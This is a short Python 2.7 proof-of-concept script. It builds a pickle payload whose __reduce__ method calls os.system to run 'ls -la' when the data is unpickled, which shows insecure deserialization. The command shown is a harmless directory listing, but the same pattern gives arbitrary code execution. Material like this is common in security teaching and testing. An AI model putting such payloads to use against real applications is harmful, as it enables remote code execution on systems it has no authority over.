#!/usr/bin/python2.7

import cPickle
import os
import base64


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('ls -la',))


print cPickle.dumps(Exploit())
